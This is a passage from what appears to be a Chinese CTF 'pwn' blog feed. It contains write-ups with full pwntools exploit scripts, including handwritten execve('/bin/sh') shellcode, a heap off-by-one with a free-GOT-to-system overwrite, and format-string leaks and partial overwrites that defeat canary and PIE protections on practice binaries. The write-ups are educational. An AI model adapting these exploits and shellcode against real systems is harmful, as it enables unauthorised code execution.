class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,25581)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入shellcode</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh()) 过长 </span></span><br><span class="line"><span class="comment"># 自己构造execve(&#x27;/bin/sh&#x27;,0,0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # 将/bin/sh\x00入栈</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32位系统调用号</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_heapcreator--简单堆利用</title>
      <link href="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-hitcontraining-heapcreator"><a href="#BUUCTF-hitcontraining-heapcreator" class="headerlink" title="BUUCTF-hitcontraining_heapcreator"></a>BUUCTF-hitcontraining_heapcreator</h1><ul><li><p><a class="link" href="https://buuoj.cn/challenges#hitcontraining_heapcreator">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>glibc2.24</p></li></ul><p><font size="4"><strong>很明显的堆菜单题目</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/%E6%80%BB%E8%A7%88.bmp"></p><ul><li><font size="4" color="red"><strong>menu</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/menu.bmp"></p><ul><li><font size="4" color="red"><strong>create_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/add.bmp"></p><ul><li><font size="4" color="red"><strong>delete_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/delete.bmp"></p><ul><li><font size="4" color="red"><strong>edit_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/edit.bmp"></p><ul><li><font size="4" color="red"><strong>show_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/show.bmp"></p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><font color="red">分析：</font></h3><ul><li>各个功能块都展示完了，发现在edit_heap有一个**<font color="red">off_by_one漏洞，那么我们可以修改下一个chunk的size**</font></li><li>将其free掉,再add回来，就可以修改chunk的内容，注意到show_heap是一个**%s + 地址**，那么我们将其填入free_got，就可以得到free的真实地址，从而泄露libc，获得system，但是光system不够啊。</li><li>再注意到delete_heap,是free(地址),我们将<strong>free_got -&gt; system</strong>，再在那个地址填入<strong>b’&#x2F;bin&#x2F;sh\x00’</strong>,就可以getshell了</li><li>具体思路就这些了，来看gdb调试的：</li></ul><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a><font color="red">gdb调试</font></h3><p><font size="4" color="red">1.申请三次chunk</font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6个chunk</span></span><br><span class="line">bug()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/1.bmp"></p><ul><li>调用了三次create_heap,有6个chunk,看看其内容是什么</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/2.bmp"></p><p>可以猜测，相比于正常的chunk结构，这里前面多了一个chunk的结构体，记录了其size和user_data_address</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span>* heaparray[i] <span class="comment">// 大概意思 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><font size="4" color="red"><strong>2.利用off_by_one修改size</strong></font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/3.bmp"></p><ul><li>从箭头处,也就是data处填入数据，往heaparray[0]处地址写入&#x2F;bin&#x2F;sh，修改chunk1结构体size,<strong>使得下方0x70的内容被合并为一个chunk</strong>，之后的free和malloc都会被当成一个chunk处理</li></ul><p><font size="4" color="red"><strong>3.add修改show部分的地址为free_got，泄露libc</strong></font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 此时<span class="number">1</span>,<span class="number">2</span>合并，修改<span class="number">2</span>号chunk_data为free_got，show出来泄漏真实地址</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x8</span>) + p64(free_got) <span class="comment">#0x8记录的是chunk2的size，也是后面edit的长度，0x8,0x10都可以</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/4.bmp"></p><ul><li>对于chunk2,也就是heaparray[2]来说，它的内容已经更改，show的时候就是show(0x602018)，也就是将free_got指向的内容给输出出来，也就是输出free的真实地址</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/6.bmp"></p><ul><li>此时的heaparray内容如上，因此show可以将free真实地址show出来</li></ul><p><font size="4" color="red"><strong>4.修改free_got-&gt;system，然后执行free</strong></font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27902)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>): <span class="comment"># off_by_one</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6个chunk</span></span><br><span class="line"><span class="comment"># bug()</span></span><br><span class="line"><span class="comment"># 利用off_by_one修改size</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时1,2合并，修改2号chunk_data为free_got，show出来泄漏真实地址</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x10</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>在分析各个功能块的时候就要有想法，简单堆题一定要对地址掌握收悉。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE保护</title>
      <link href="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/"/>
      <url>/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h1><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>参考：<a class="link" href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq+W5q5Mf+bD#toc-0">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font size="4" color="red">pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的</font></p><ul><li>从ida来看，地址基本都是<strong>四位数</strong>，如下：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../ida%E7%9C%8Bpie.bmp"></p><ul><li>差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给出来的只是偏移地址。</li></ul><p><font size="4" color="red">程序的实际运行地址 &#x3D; 程序加载基址 + 程序偏移地址</font></p><ul><li><fron color="red">注意：即使开启了pie，真实地址和ida中所看到的偏移地址的末三位数字肯定还是一样的，这是由于内存页对其的原理。</fron></li></ul><h2 id="关于开启pie的gdb调试"><a href="#关于开启pie的gdb调试" class="headerlink" title="关于开启pie的gdb调试"></a>关于开启pie的gdb调试</h2><ul><li><strong>指令</strong>：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(偏移地址) <span class="comment"># 偏移地址从ida看</span></span><br></pre></td></tr></table></figure></div><ul><li>注意程序要先run起来，才可以打断点</li></ul><h1 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h1><h2 id="1-深育杯-2021-find-flag-格式化字符串-pie"><a href="#1-深育杯-2021-find-flag-格式化字符串-pie" class="headerlink" title="1.[深育杯 2021]find_flag(格式化字符串-pie)"></a>1.<strong>[深育杯 2021]find_flag</strong>(格式化字符串-pie)</h2><p><a class="link" href="https://www.nssctf.cn/problem/774">题目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="/../checksec.bmp"></p><ul><li><strong>保护全开直接看ida</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p><ul><li><strong>很明显的格式化字符串漏洞，先泄露canary和pie基地址，然后栈溢出到后门函数就可以了</strong> (此题有后门函数)</li></ul><p><font size="5" color="red"><strong>gdb调试查找泄露偏移</strong></font></p><ul><li>在格式化字符串漏洞那里下断点：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p><ul><li>先让程序start，然后如上面下断点，查看栈结构</li><li><strong>rbp上方的就是canary</strong>, 距离rsp偏移是11，看最左侧也可以看出来，0xb，再加上6个寄存器(64位),偏移地址是17</li><li>如何泄露pie地址，我们要得到一个<strong>既可以在ida中可以查看偏移的地址，也可以泄露出其真实地址的地方</strong>， 正如下方,偏移位0x146f的地方,泄露这个地方的地址，减去0x146f，就可以得到pie的基地址了。</li><li><font color="red">注意：ROPgadget看到的地址也只是偏移地址，要加上pie的基地址后才可以使用：</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../ROPgadget.bmp"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28406</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串泄露canary和pie基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%17$p-%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x146F</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]pie_base = <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈溢出getflag</span></span><br><span class="line">getflag = pie_base + <span class="number">0x01231</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Anything else? &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h6 id><a href="#" class="headerlink" title></a></h6><h2 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h2><p><a class="link" href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="/../pie2-1.bmp"></p><ul><li><strong>通过printf遇到\x00才会停止输出的特性，从而泄露canary</strong></li><li><font color="red">但是此时无法泄露出pie的基地址了，那么我们就无法修改ret_address了吗？其实不然</font></li></ul><p>之前说过，由于页对其的机制，即使开启了pie，其末三位16进制数字也是一样的，正是因为这个，**所以返回地址和后门函数的地址应该只有末四位不同(运气最差的情况下)**，所以我们只需要修改末四位就可以ret到后门函数，从而getshell。</p><ul><li>此题目就是如此，但是只需要修改末两位就可以getshell</li></ul><p><font size="4"><strong>gdb 调试，画框部分其实就是main函数结束后的返回地址，发现偏移是0xa6a</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../pie2-2.bmp"></p><p><strong><font size="4">ida中system(“&#x2F;bin&#x2F;sh”)的地址偏移是0xa42，只有后两位不同，修改后两位即可</font></strong></p><p><img lazyload src="/images/loading.svg" data-src="/../pie2-3.bmp"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26786</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x25</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell = 0x00A3E</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>如果有多位不同，而我们又只能逐字节更改，有时就需要自己写脚本爆破了</p><h2 id="3-Basectf-week3-PIE-爆破返回地址"><a href="#3-Basectf-week3-PIE-爆破返回地址" class="headerlink" title="3.Basectf-week3-PIE(爆破返回地址)"></a>3.Basectf-week3-PIE(爆破返回地址)</h2><p><a class="link" href="https://www.basectf.fun/">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="/../3-1.bmp"></p><ul><li>发现主函数就这些，什么都没有，所以我们要泄露libc，获得system函数,所需的gadget。</li><li>但是我们无法像基本的ret2libc一样ret到main函数，那么如何修改呢？看下面的调试：</li></ul><h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img lazyload src="/images/loading.svg" data-src="/../3-2.bmp"></p><ul><li>如图，返回地址是__libc_start_main+128，按照之前的方法来说，这里应该是一个pie+偏移的地址，我们修改末两字节就可以返回到main函数，然后通过泄露的地址计算出pie基地址，进行其他操作。</li><li>但是这里不是，但是难道就不行了吗？其实不然，__libc_start_main函数附近也有gadget可以使我们返回main函数，可以自己用telescope去慢慢找，但是也可以直接爆破。</li><li>其实你要知道，这题目肯定是修改末字节可以返回main函数的，不然就写不出来了。</li></ul><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 